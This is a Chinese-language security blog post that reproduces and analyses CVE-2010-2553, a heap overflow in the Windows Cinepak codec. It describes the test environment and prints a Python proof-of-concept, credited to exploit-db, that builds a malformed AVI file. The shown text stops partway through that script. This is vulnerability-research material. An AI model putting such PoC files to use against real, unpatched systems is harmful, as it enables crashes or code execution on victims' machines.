<!DOCTYPE html>
<html lang="zh-Hans">
<head>

    <!--[if lt IE 9]>
        <style>body {display: none; background: none !important} </style>
        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
    <![endif]-->


<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="format-detection" content="telephone=no" />
<meta name="author" content="Sp4n9x" />
<meta name="renderer" content="webkit">
<meta name="google" value="notranslate">



<meta name="description" content="这个漏洞是《漏洞战争》中的堆溢出漏洞章节中使用的例子。堆溢出漏洞比栈溢出漏洞更难发现，漏洞利用难度相对于栈溢出漏洞也更难。栈溢出漏洞已经很少见了，堆溢出的漏洞越来越多，所以学习堆溢出漏洞的分析更加有必要。此漏洞涉及到AVI文件的构造，所以需要了解AVI文件格式的构成，更多细节可以看《AVI文件格式分析》的文章。&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;">
<meta name="keywords" content="Windows,FileFormat,AVI,Cinepak,Heap Overflow">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2010-2553复现与分析">
<meta property="og:url" content="http://sp4n9x.github.io/2021/01/10/CVE-2010-2553复现与分析/index.html">
<meta property="og:site_name" content="Sp4n9x&#39;s Blog">
<meta property="og:description" content="这个漏洞是《漏洞战争》中的堆溢出漏洞章节中使用的例子。堆溢出漏洞比栈溢出漏洞更难发现，漏洞利用难度相对于栈溢出漏洞也更难。栈溢出漏洞已经很少见了，堆溢出的漏洞越来越多，所以学习堆溢出漏洞的分析更加有必要。此漏洞涉及到AVI文件的构造，所以需要了解AVI文件格式的构成，更多细节可以看《AVI文件格式分析》的文章。&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://sp4n9x.github.io/resources/2021/CVE-2010-2553/补丁前后关键函数对比图.png">
<meta property="og:updated_time" content="2021-02-16T12:54:31.405Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CVE-2010-2553复现与分析">
<meta name="twitter:description" content="这个漏洞是《漏洞战争》中的堆溢出漏洞章节中使用的例子。堆溢出漏洞比栈溢出漏洞更难发现，漏洞利用难度相对于栈溢出漏洞也更难。栈溢出漏洞已经很少见了，堆溢出的漏洞越来越多，所以学习堆溢出漏洞的分析更加有必要。此漏洞涉及到AVI文件的构造，所以需要了解AVI文件格式的构成，更多细节可以看《AVI文件格式分析》的文章。&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;">
<meta name="twitter:image" content="http://sp4n9x.github.io/resources/2021/CVE-2010-2553/补丁前后关键函数对比图.png">

<link rel="apple-touch-icon" href= "/apple-touch-icon.png">


    <link rel="alternative" href="/atom.xml" title="Sp4n9x&#39;s Blog" type="application/atom+xml">



    <link rel="shortcut icon" href="/favicon.ico">



    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">



    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">



    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">


<link rel="stylesheet" href="/css/style.css">



<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">


<title>CVE-2010-2553复现与分析 | Sp4n9x&#39;s Blog</title>

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>

<script>
    var yiliaConfig = {
        fancybox: true,
        animate: true,
        isHome: false,
        isPost: true,
        isArchive: false,
        isTag: false,
        isCategory: false,
        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
        search: true
    }
</script>


    <script>
        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
    </script>



    <script> yiliaConfig.rootUrl = "\/";</script>





    <script>
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "//hm.baidu.com/hm.js?48aad015dbbeb363812643fd03e528c5";
            var s = document.getElementsByTagName("script")[0]; 
            s.parentNode.insertBefore(hm, s);
        })();
    </script>


</head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            <img src="/img/avatar.png" class="animated zoomIn">
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/">Sp4n9x</a></h1>
        </hgroup>

        

        
            <form id="search-form">
            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
            <i class="fa fa-times" onclick="resetSearch()"></i>
            </form>
            <div id="local-search-result"></div>
            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
        


        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">主页</a></li>
                        
                            <li><a href="/archives/">所有文章</a></li>
                        
                            <li><a href="/tags/">标签云</a></li>
                        
                            <li><a href="/about/">留言板</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" href="mailto:sp4n9x@qq.com" title="Email"></a>
                            
                                <a class="fa 新浪微博" href="https://weibo.com/u/5721141892" title="新浪微博"></a>
                            
                                <a class="fa GitHub" href="https://github.com/Sp4n9x" title="GitHub"></a>
                            
                                <a class="fa 知乎" href="https://www.zhihu.com/people/pangx-cn/columns" title="知乎"></a>
                            
                                <a class="fa 网易云音乐" href="http://music.163.com/#/user/home?id=439043183" title="网易云音乐"></a>
                            
                            <!--
                            <div id="music163player">
                                <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=250 height=86 src="//music.163.com/outchain/player?type=2&id=535693399&auto=1&height=66">
                                </iframe>
                            </div>
                            -->
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/AVI/">AVI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Adobe-Reader/">Adobe Reader</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Cinepak/">Cinepak</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DNS隐蔽信道通信/">DNS隐蔽信道通信</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/FileFormat/">FileFormat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Got表覆写/">Got表覆写</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Heap-Overflow/">Heap Overflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kali/">Kali</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Microsoft-Office/">Microsoft Office</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pdf/">Pdf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ROP/">ROP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Rtf/">Rtf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SEH/">SEH</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL注入/">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Stack-Overflow/">Stack Overflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Ubuntu/">Ubuntu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/">Windows</a></li></ul>
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a class="main-nav-link switch-friends-link" href="//moxfive.xyz/">MOxFIVE</a>
                    
                    </div>
                </section>
                

                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">Sp4n9x&#39;s 简介</div>
                </section>
                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Sp4n9x</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                <img src="/img/avatar.png" class="animated zoomIn">
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页">Sp4n9x</a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">主页</a></li>
                
                    <li><a href="/archives/">所有文章</a></li>
                
                    <li><a href="/tags/">标签云</a></li>
                
                    <li><a href="/about/">留言板</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" target="_blank" href="mailto:sp4n9x@qq.com" title="Email"></a>
                            
                                <a class="fa 新浪微博" target="_blank" href="https://weibo.com/u/5721141892" title="新浪微博"></a>
                            
                                <a class="fa GitHub" target="_blank" href="https://github.com/Sp4n9x" title="GitHub"></a>
                            
                                <a class="fa 知乎" target="_blank" href="https://www.zhihu.com/people/pangx-cn/columns" title="知乎"></a>
                            
                                <a class="fa 网易云音乐" target="_blank" href="http://music.163.com/#/user/home?id=439043183" title="网易云音乐"></a>
                            
                        </ul>
            </nav>
        </header>                
    </div>
</nav>
      <div class="body-wrap"><article id="post-CVE-2010-2553复现与分析" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/01/10/CVE-2010-2553复现与分析/" class="article-date">
      <time datetime="2021-01-09T16:00:00.000Z" itemprop="datePublished">2021-01-10</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      CVE-2010-2553复现与分析
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/CVE/">CVE</a>
    </div>


        
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/AVI/">AVI</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Cinepak/">Cinepak</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/FileFormat/">FileFormat</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Heap-Overflow/">Heap Overflow</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Windows/">Windows</a></li></ul>
    </div>

        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
      
          
        <blockquote>
<p>这个漏洞是《漏洞战争》中的堆溢出漏洞章节中使用的例子。<br>堆溢出漏洞比栈溢出漏洞更难发现，漏洞利用难度相对于栈溢出漏洞也更难。<br>栈溢出漏洞已经很少见了，堆溢出的漏洞越来越多，所以学习堆溢出漏洞的分析更加有必要。<br>此漏洞涉及到AVI文件的构造，所以需要了解AVI文件格式的构成，更多细节可以看《AVI文件格式分析》的文章。<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;——当你的才华还配不上你的野心时，请静下来好好努力！<br><a id="more"></a></p>
</blockquote>
<h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>&emsp;&emsp;<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2553" target="_blank" rel="noopener">CVE-2010-2553</a>是<code>Windows XP SP2</code>和<code>Windows XP SP3</code>、<code>Windows Vista SP1</code>和<code>Windows Vista SP2</code>以及<code>Windows 7</code>中的<code>Cinepak</code>视频编解码器(<code>iccvid.dll</code>)不能正确解压媒体文件，这使得<code>远程攻击者</code>可以通过一个精心制作的文件<code>执行任意代码</code>，也称为<code>“Cinepak视频编解码器解压漏洞”</code>。<code>Cinepak</code>视频编解码器(<code>iccvid.dll</code>)中的<code>CVDecompress函数</code>解压缩媒体文件时，未对<code>“Cinepak(CVID) Stream Format”</code>中的<code>“Number of coded strips(Frame Header)”</code>进行限制，导致在复制数据时造成<code>堆溢出</code>，利用此漏洞可造成<code>程序奔溃</code>或者<code>执行任意代码</code>。此漏洞的<code>微软漏洞编号</code>为<a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2010/ms10-055" target="_blank" rel="noopener">MS10-055</a>。</p>
<h2 id="0x10-分析环境"><a href="#0x10-分析环境" class="headerlink" title="0x10 分析环境"></a>0x10 分析环境</h2><table>
<thead>
<tr>
<th style="text-align:center"></th>
<th style="text-align:left">使用的环境</th>
<th style="text-align:left">备注</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">操作系统</td>
<td style="text-align:left">Windows XP SP3</td>
<td style="text-align:left">版本号:Windows XP Professional SP3 简体中文版</td>
</tr>
<tr>
<td style="text-align:center">虚拟机</td>
<td style="text-align:left">VMWare Workstations</td>
<td style="text-align:left">版本号:15.5.1</td>
</tr>
<tr>
<td style="text-align:center">调试器</td>
<td style="text-align:left">WinDbg</td>
<td style="text-align:left">版本号:v6.12(x86)</td>
</tr>
<tr>
<td style="text-align:center">反汇编器</td>
<td style="text-align:left">IDA Pro</td>
<td style="text-align:left">版本号:7.0</td>
</tr>
<tr>
<td style="text-align:center">视频软件</td>
<td style="text-align:left">Microsoft Media Player</td>
<td style="text-align:left">版本号:10.00.00.3802</td>
</tr>
<tr>
<td style="text-align:center">漏洞模块</td>
<td style="text-align:left">Cinepak for Windows 32(iccvid.dll)</td>
<td style="text-align:left">版本号:1.10.0.12,Windows系统模块</td>
</tr>
</tbody>
</table>
<h2 id="0x20-漏洞复现"><a href="#0x20-漏洞复现" class="headerlink" title="0x20 漏洞复现"></a>0x20 漏洞复现</h2><p>&emsp;&emsp;用于<code>触发漏洞</code>的PoC代码，运行后会生成<code>poc.avi</code>，该份代码是由<code>Abysssec</code>安全组织公布在<code>exploit-db</code>站点上的：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">  __  __  ____         _    _ ____  </span></span><br><span class="line"><span class="string"> |  \/  |/ __ \   /\  | |  | |  _ \ </span></span><br><span class="line"><span class="string"> | \  / | |  | | /  \ | |  | | |_) |</span></span><br><span class="line"><span class="string"> | |\/| | |  | |/ /\ \| |  | |  _ &lt; </span></span><br><span class="line"><span class="string"> | |  | | |__| / ____ \ |__| | |_) |</span></span><br><span class="line"><span class="string"> |_|  |_|\____/_/    \_\____/|____/ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">http://www.exploit-db.com/moaub-26-microsoft-cinepak-codec-cvdecompress-heap-overflow-ms10-055/</span></span><br><span class="line"><span class="string">https://www.exploit-db.com/exploits/15112</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  Title             : Microsoft Cinepak Codec CVDecompress Heap Overflow</span></span><br><span class="line"><span class="string">  Version           : iccvid.dll XP SP3</span></span><br><span class="line"><span class="string">  Analysis          : http://www.abysssec.com</span></span><br><span class="line"><span class="string">  Vendor            : http://www.microsoft.com</span></span><br><span class="line"><span class="string">  Impact            : High</span></span><br><span class="line"><span class="string">  Contact           : shahin [at] abysssec.com , info  [at] abysssec.com</span></span><br><span class="line"><span class="string">  Twitter           : @abysssec</span></span><br><span class="line"><span class="string">  CVE               : CVE-2010-2553</span></span><br><span class="line"><span class="string">  MOAUB Number      : </span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    aviHeaders = (<span class="string">"\x52\x49\x46\x46"</span> <span class="comment"># dwList = "RIFF"</span></span><br><span class="line">                  <span class="string">"\x58\x01\x00\x00"</span> <span class="comment"># dwSize = 0x158 = 344 byte</span></span><br><span class="line">                  <span class="string">"\x41\x56\x49\x20"</span> <span class="comment"># dwFourCC = "AVI "</span></span><br><span class="line">                  <span class="string">"\x4C\x49\x53\x54"</span>    <span class="comment"># dwList = "LIST" &lt;---------------------------+</span></span><br><span class="line">                  <span class="string">"\xC8\x00\x00\x00"</span>    <span class="comment"># dwSize = 0xc8 = 200 byte                    |  </span></span><br><span class="line">                  <span class="string">"\x68\x64\x72\x6C"</span>    <span class="comment"># dwFourCC = "hdrl"                           |  </span></span><br><span class="line">                  <span class="string">"\x61\x76\x69\x68"</span>        <span class="comment"># dwFourCC = "avih" &lt;-----------+         |  </span></span><br><span class="line">                  <span class="string">"\x38\x00\x00\x00"</span>        <span class="comment"># dwSize = 0x38 = 56 byte       |         |  </span></span><br><span class="line">                  <span class="string">"\xA0\x86\x01\x00"</span>        <span class="comment"># dwMicroSecPerFrame = 0x186A0  |         |  </span></span><br><span class="line">                  <span class="string">"\x00\x00\x00\x00"</span>        <span class="comment"># dwMaxBytesPerSec = 0x0        |         |  </span></span><br><span class="line">                  <span class="string">"\x00\x00\x00\x00"</span>        <span class="comment"># dwPaddingGranularity = 0x0    |         |  </span></span><br><span class="line">                  <span class="string">"\x10\x01\x00\x00"</span>        <span class="comment"># dwFlages = 0x110              |         |  </span></span><br><span class="line">                  <span class="string">"\x4E\x00\x00\x00"</span>        <span class="comment"># dwTotalFrame = 0x4E = 78      |         |  </span></span><br><span class="line">                  <span class="string">"\x00\x00\x00\x00"</span>        <span class="comment"># dwInitialFrames = 0x0       "avih"      |  </span></span><br><span class="line">                  <span class="string">"\x01\x00\x00\x00"</span>        <span class="comment"># dwStreams = 0x1               |         |  </span></span><br><span class="line">                  <span class="string">"\x00\x00\x00\x00"</span>        <span class="comment"># dwSuggestedBufferSize = 0x0   |         |  </span></span><br><span class="line">                  <span class="string">"\x60\x01\x00\x00"</span>        <span class="comment"># dwWidth = 0x160 = 352         |         |  </span></span><br><span class="line">                  <span class="string">"\x20\x01\x00\x00"</span>        <span class="comment"># dwHeight = 0x120 = 288        |         |  </span></span><br><span class="line">                  <span class="string">"\x00\x00\x00\x00"</span>        <span class="comment"># dwReserved[0]                 |         |  </span></span><br><span class="line">                  <span class="string">"\x00\x00\x00\x00"</span>        <span class="comment"># dwReserved[1]                 |         |  </span></span><br><span class="line">                  <span class="string">"\x00\x00\x00\x00"</span>        <span class="comment"># dwReserved[2]                 |         |  </span></span><br><span class="line">                  <span class="string">"\x00\x00\x00\x00"</span>        <span class="comment"># dwReserved[3] &lt;---------------+         |  </span></span><br><span class="line">                  <span class="string">"\x4C\x49\x53\x54"</span>        <span class="comment"># dwList = "LIST" &lt;------------------+    |  </span></span><br><span class="line">                  <span class="string">"\x7C\x00\x00\x00"</span>        <span class="comment"># dwSize = 0x7C = 124 byte           |    |  </span></span><br><span class="line">                  <span class="string">"\x73\x74\x72\x6C"</span>        <span class="comment"># dwFourCC = "strl"                  |    |  </span></span><br><span class="line">                  <span class="string">"\x73\x74\x72\x68"</span>            <span class="comment"># dwFourCC = "strh" &lt;-------+    |    |  </span></span><br><span class="line">                  <span class="string">"\x38\x00\x00\x00"</span>            <span class="comment"># dwSize = 0x38 = 56 byte   |    |    |  </span></span><br><span class="line">                  <span class="string">"\x76\x69\x64\x73"</span>            <span class="comment"># fccType = "vids"          |    |    |  </span></span><br><span class="line">                  <span class="string">"\x63\x76\x69\x64"</span>            <span class="comment"># fccHandler = "cvid"       |    |    |  </span></span><br><span class="line">                  <span class="string">"\x00\x00\x00\x00"</span>            <span class="comment"># dwFlags = 0x0             |    |    |  </span></span><br><span class="line">                  <span class="string">"\x00\x00"</span>                    <span class="comment"># wPriority = 0x0           |    |    |  </span></span><br><span class="line">                  <span class="string">"\x00\x00"</span>                    <span class="comment"># wLanguage = 0x0           |    |    |  </span></span><br><span class="line">                  <span class="string">"\x00\x00\x00\x00"</span>            <span class="comment"># dwInitalFrames = 0x0      |    | "hdrl"  </span></span><br><span class="line">                  <span class="string">"\xE8\x03\x00\x00"</span>            <span class="comment"># dwScale = 0x3E8 = 1000 "strh"  |    |  </span></span><br><span class="line">                  <span class="string">"\x10\x27\x00\x00"</span>            <span class="comment"># dwRate = 0x2710 = 10000   |    |    |  </span></span><br><span class="line">                  <span class="string">"\x00\x00\x00\x00"</span>            <span class="comment"># dwStart = 0x0             |    |    |  </span></span><br><span class="line">                  <span class="string">"\x4E\x00\x00\x00"</span>            <span class="comment"># dwLength = 0x4E = 78      |    |    |  </span></span><br><span class="line">                  <span class="string">"\x20\x74\x00\x00"</span>            <span class="comment"># dwSuggestedBufferSize     |    |    |     ; 0x7420=29728</span></span><br><span class="line">                  <span class="string">"\xFF\xFF\xFF\xFF"</span>            <span class="comment"># dwQuality = -1            |    |    |  </span></span><br><span class="line">                  <span class="string">"\x00\x00\x00\x00"</span>            <span class="comment"># dwSampleSize = 0x0        |    |    |  </span></span><br><span class="line">                  <span class="string">"\x00\x00"</span>                        <span class="comment"># left = 0x0            | "strl"  |  </span></span><br><span class="line">                  <span class="string">"\x00\x00"</span>                        <span class="comment"># top = 0x0             |    |    |  </span></span><br><span class="line">                  <span class="string">"\x60\x01"</span>                        <span class="comment"># right = 0x160 = 352   |    |    |  </span></span><br><span class="line">                  <span class="string">"\x20\x01"</span>                        <span class="comment"># bottom =0x120 = 288&lt;--+    |    |  </span></span><br><span class="line">                  <span class="string">"\x73\x74\x72\x66"</span>            <span class="comment"># dwFourCC = "strf" &lt;-------+    |    |  </span></span><br><span class="line">                  <span class="string">"\x28\x00\x00\x00"</span>            <span class="comment"># dwSize = 0x28 = 40 byte   |    |    |  </span></span><br><span class="line">                  <span class="string">"\x28\x00\x00\x00"</span>            <span class="comment"># biSize = 0x28 = 40 byte   |    |    |  </span></span><br><span class="line">                  <span class="string">"\x50\x01\x00\x00"</span>            <span class="comment"># biWidth = 0x150 = 336     |    |    |  </span></span><br><span class="line">                  <span class="string">"\x20\x01\x00\x00"</span>            <span class="comment"># biHeight =0x120 = 288     |    |    |  </span></span><br><span class="line">                  <span class="string">"\x01\x00"</span>                    <span class="comment"># biPlanes = 0x1         "strf"  |    |  </span></span><br><span class="line">                  <span class="string">"\x18\x00"</span>                    <span class="comment"># biBitCount = 0x18 = 24    |    |    |  </span></span><br><span class="line">                  <span class="string">"\x63\x76\x69\x64"</span>            <span class="comment"># biCompression = "cvid"    |    |    |  </span></span><br><span class="line">                  <span class="string">"\x84\x8D\x00\x00"</span>            <span class="comment"># biSizeImage=0x8D84=36228  |    |    |  </span></span><br><span class="line">                  <span class="string">"\x00\x00\x00\x00"</span>            <span class="comment"># biXPelsPerMeter = 0x0     |    |    |  </span></span><br><span class="line">                  <span class="string">"\x00\x00\x00\x00"</span>            <span class="comment"># biYPelsPerMeter = 0x0     |    |    |  </span></span><br><span class="line">                  <span class="string">"\x00\x00\x00\x00"</span>            <span class="comment"># biClrUsed = 0x0           |    |    |  </span></span><br><span class="line">                  <span class="string">"\x00\x00\x00\x00"</span>)           <span class="comment"># biClrImportant = 0x0 &lt;----+    |    |  </span></span><br><span class="line">                                                <span class="comment">#                                |    |  </span></span><br><span class="line">    padding =    (<span class="string">"\x4A\x55\x4E\x4B"</span>            <span class="comment"># dwFourCC = "JUNK"              |    |  </span></span><br><span class="line">                  <span class="string">"\x00\x00\x00\x00"</span>            <span class="comment"># dwSize = 0x0 &lt;-----------------+----+</span></span><br><span class="line">                  <span class="string">"\x4A\x55\x4E\x4B"</span>        <span class="comment"># dwFourCC = "JUNK"                       </span></span><br><span class="line">                  <span class="string">"\x00\x00\x00\x00"</span>)       <span class="comment"># dwSize = 0x0 </span></span><br><span class="line">                                        </span><br><span class="line">    movi_tag =   (<span class="string">"\x4C\x49\x53\x54"</span>    <span class="comment"># dwList = "LIST" &lt;-----------------------------------------+</span></span><br><span class="line">                  <span class="string">"\x5C\x00\x00\x00"</span>    <span class="comment"># dwSize = 0x5C = 92 byte                                   |</span></span><br><span class="line">                  <span class="string">"\x6D\x6F\x76\x69"</span>    <span class="comment"># dwFourCC = "movi"                                         |</span></span><br><span class="line">                  <span class="string">"\x30\x30\x64\x63"</span>        <span class="comment"># dwFourCC = "00dc"                                     |   ; 压缩视频帧数据块</span></span><br><span class="line">                  <span class="string">"\x10\x00\x00\x00"</span>)       <span class="comment"># dwSize = 0x10 = 16 byte                               |</span></span><br><span class="line">                                            <span class="comment">#                                                       |</span></span><br><span class="line">    cinepak_codec_data1 = (<span 